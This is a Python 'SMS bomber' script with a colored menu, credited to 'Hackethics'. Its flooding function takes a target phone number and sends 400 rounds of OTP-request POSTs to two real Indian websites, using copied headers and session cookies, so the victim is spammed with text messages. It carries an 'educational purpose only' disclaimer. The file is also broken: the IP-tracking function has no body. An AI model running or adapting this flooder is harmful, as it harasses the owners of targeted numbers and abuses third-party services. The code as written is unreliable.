import os
import time
import requests

black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
nc = "\033[00m"

meanu=f"""{yellow}
____________________________________________________
{yellow}|\---/{bblue}C{yellow}\---/{bgreen}Y{yellow}\---/{byellow}B{yellow}\---/{bpurple}E{yellow}\---/{white}R{yellow}\---/{bred}Vic{yellow}\---/{bgreen}ky{yellow}\---/|
{white}|-\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /\ /-|
{green}|--X--X--X--X--X--X--X--X--X--X--X--X--X--X--X--X--|
{yellow}|  |{bblue}T {yellow}|{bblue}O {yellow}|{bblue}O {yellow}|{bblue}L {yellow}|{bpurple}B {yellow}|{bpurple}Y {yellow}|{bblue}:-{yellow}|{bcyan}C {yellow}|{bcyan}Y {yellow}|{bcyan}B {yellow}|{bcyan}E {yellow}|{bcyan}R {yellow}|  {yellow}|{bcyan}D {yellow}|{bcyan}K {yellow}|  {yellow}|
{white}|__|__|__|__|__|__|__|__|__|__|__|__|__|__|__|__|__|
{green}|                                                  |
{yellow}|{cyan}-------------{red}x{cyan}-{red}[{green}1{red}]-{white}>{byellow}Sms-Flooding{white}<{cyan}-{red}[{green}1{red}]{cyan}-{red}x{cyan}-----------|
{white}|                                                  |  
{green}|{cyan}----------------{red}x{cyan}-{red}[{green}2{red}]{cyan}-{white}>{byellow}About{white}<{cyan}-{red}[{green}2{red}]{cyan}-{red}x{cyan}---------------|
{yellow}|                                                  |   
{white}|{cyan}--------------{red}x{cyan}-{red}[{green}3{red}]{cyan}-{white}>{byellow}IP-Track{white}<{cyan}-{red}[{green}3{red}]{cyan}-{red}x{cyan}--------------|   
{green}|                                                  |
{yellow}|{cyan}----------------{red}x{cyan}-{red}[{green}4{red}]{cyan}-{white}>{byellow}Exit{white}<{cyan}-{red}[{green}4{red}]{cyan}-{red}x{cyan}----------------|
{white}|__________________________________________________|
"""


def about():
    os.system("clear")
    print(f"""
{bcyan}[-]This tool is Created By Cyber Army

{yellow}Author    :  Hackethics
Github    :  https://github.com/Hackethics138
Version   :  1.0

{red}[-]Warning:

{blue}This Tool is made for educational purpose
only ! Author will not be responsible for
any misuse of this toolkit !


{bgreen}[-]Developer SocialMedia
{red}[{byellow}1{red}]{white}-{red}>{bcyan}Hackethics   : Instagram
{red}[{byellow}2{red}]{white}-{red}>{bcyan}Hackethics   : Telegram
{red}[{byellow}0{red}]{white}-{red}>{bcyan}Exit
""")
    option=input(f"{bred}Choose an option:{white}")
    try:
        if option=="1":
            os.system("xdg-open https://www.instagram.com/hackethics138/ > /dev/null 2>&1 &")
        elif option=="2":
            os.system("xdg-open https://t.me/hackethics138/ > /dev/null 2>&1 &")
        elif option=="0":
            logic()
        else:
            print(f"{red}Invlied Option....")
            time.sleep(0.8)
            about()
    except:
        print(f"{red}SomeThing Went Wrong...")
def iptrack():
    
def logic():
    os.system("clear")
    print(meanu)
    option=input(f"{bred}Choose an option:{white}")
    try:
        if option=="1":
            boomber()
        elif option=="2":
            about()
        elif option=="3":
            iptrack()
        elif option=="4":
            os.system("clear")
            print(f"{bgreen}Thank You For Using...")
        else:
            os.system("clear")
            print(meanu)
            print(f"{red}Invlied Option....")
            time.sleep(0.8)
            logic()
    except:
        print(f"{red}SomeThing Went Wrong...")
        
def boomber():
    global number
    os.system("clear")
    number=input(f"{bred}Enter the number:{white}")
    os.system("clear")
   
    nykaa_url = "https://www.nykaafashion.com/webscripts/api/otp/generate"
    nykaa_headers = {
        "Host": "www.nykaafashion.com",
        "content-length": "32",
        "cache-control": "max-age=0",
        "origin": "https://www.nykaafashion.com",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
        "dnt": "1",
        "content-type": "application/json",
        "accept": "*/*",
        "referer": "https://www.nykaafashion.com/authorization?authPage=sign-up-mobile&redirectURL=%2F",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en,hi;q=09",
        "cookie": "s_sq=fsnecommercenykaadesignstudio%3D%2526c.%2526a.%2526activitymap.%2526page%253Dnds%25253Asign_up%25253Amobile%2526link%253DSubmit%2526region%253Dapp%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253Dnds%25253Asign_up%25253Amobile%2526pidt%253D1%2526oid%253DfunctionWn%252528%252529%25257B%25257D%2526oidt%253D2%2526ot%253DSUBMIT; s_nr=1615398192551-New; TSd06dbe12027=089189808bab2000b5dff6b4d83df89347395dc5899992e1b74c5b93acd3d19371ad8e78c8375d48082a4fdc8611300095f658c60ed749e1015cc13c32d9dbc1e529477aecad3d9c66d9fb67464936ffad3389c9793ad6eeee018948748409ec; TS0120e74a=01d63715f235abd7de4d745e5d85c56871f096692ba138ec4ef174cbc71cd260165507f7ff9eca2c694604ddaaa5c55fc2269428b20f501ef06dd23c9d958504c6bed377577c10023a605e43adb59b109c004fc15fa3f435683ad9e0fc3ed74cc01e214f3455eb5b9474cf7d7d37fb318e438635ba; s_cc=true; AMCV_FE9A65E655E6E38A7F000101%40AdobeOrg=1075005958%7CMCIDTS%7C18697%7CMCMID%7C08645160895963750244551974281183840658%7CMCAAMLH-1616002827%7C12%7CMCAAMB-1616002827%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1615405227s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C4.4.1; __stp={\"visit\":\"new\",\"uuid\":\"2b5ec130-6d45-4d76-82b0-fd6eac540628\"}; __sts={\"sid\":1615398027352,\"tx\":1615398027352,\"url\":\"https%3A%2F%2Fwww.nykaafashion.com%2Fauthorization%3FauthPage%3Dsign-up-mobile%26redirectURL%3D%2F\",\"pet\":1615398027352,\"set\":1615398027352}; AMCVS_FE9A65E655E6E38A7F000101%40AdobeOrg=1;KAA_VP_USER={\"key\":28,\"ruleID\":\"start_v2\"}; private_content_version=0139219f218631b8934c18dafd361c09; PHPSESSID=rk3pmtebtvnf871tb54kivle62; f5_cspm1234; CurrencyCode=INR; countryNameFull=India; countryName=IN; f5_cspm=1234"
    }
    nykaa_data = {
        "customer_mobile": number
    }

    aakash_url = "https://www.aakash.ac.in/signup-otp-verify"
    aakash_headers = {
        "Host": "www.aakash.ac.in",
        "content-length": "21",
        "x-newrelic-id": "Vg4AV1FQABAGV1NSBQkAVlw=",
        "origin": "https://www.aakash.ac.in",
        "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "dnt": "1",
        "referer": "https://www.aakash.ac.in/user/register",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en,;q=0.9",
        "cookie": "_uetvid=fa9796a0295f11ebbf341d41f01775f2; _uetsid=fa95ab80295f11eb84b693278bab374; AWSALBCORS=SGfGPKHN9qeg73IdpfHx6HoSNlZYoMqe28R8pi8Z8qmvxsFfob+/RfpnATXKiAT3aKgGcZBWPjUqE/Yz1uZxqTzDPdjAJoB8yWzxKKbt1LlR+W/uXnwjMRBg9Ow; AWSALB=SGfGPKHN9qeg73IdpfHx6SNlZYoMqe28R8pi8Z8qmvxsFfob+/RfpnATXKiAT3aKgGcZBWPjUqE/Yz1uZxqTzDPdjAJoB8y9WzxKKbt1LlR+W/uXnwjMRBg9Ow; _gat_UA-30079688-1=1; __zlcmid=11EjasuyYkXSPRr; _fbp=fb.2.1605677779769.2005800400; _hjFirstSeen=1; _hjid=b3e7a079-8ba0-4747-b48f-746c45b9dfef; _hjTLDTest=1; _gid=GA1.3.611832579.1605677777; _ga=GA1.3.1207161440.1605677777; _gcl_au=1.1.2016065207.1605677776; _co_session_active=1"
    }
    aakash_data = {
        "mobileval": number
    }

    for i in range(400):
        nykaa_response = requests.post(nykaa_url, headers=nykaa_headers, json=nykaa_data)
        aakash_response = requests.post(aakash_url, headers=aakash_headers, data=aakash_data)
        os.system("clear")
        a=i+1
        print(f"{yellow}-->{bred}sms-flooding..{bcyan}{a}")
        
    logic()



if __name__=="__main__":
    try:
        import pyarmor
        import requests
    except ImportError:
        _ = os.system('pip install requests' if os.name == 'nt' else 'pip3 install requests')
        _ = os.system('pip install requests' if os.name == 'nt' else 'pip3 install requests')
    logic()
